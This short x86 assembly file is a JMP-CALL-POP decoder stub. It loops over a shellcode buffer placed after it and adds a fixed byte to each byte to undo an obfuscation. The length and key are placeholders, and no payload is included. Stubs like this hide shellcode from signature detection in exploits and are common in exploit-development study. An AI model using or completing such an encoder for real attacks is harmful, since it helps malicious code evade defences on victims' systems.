section .text
    global _start
_start:

jmp short addr

len:
    pop edi
    xor ecx, ecx
    mov cl, 0x0                   ; shellcode len (counter)

loop:
    add byte [edi + ecx - 1], 0x0 ; random byte used to obfuscate
    sub cl, 1
    jnz loop
    jmp short shellcode

addr:
    call len                      ; push shellcode address on the stack

shellcode: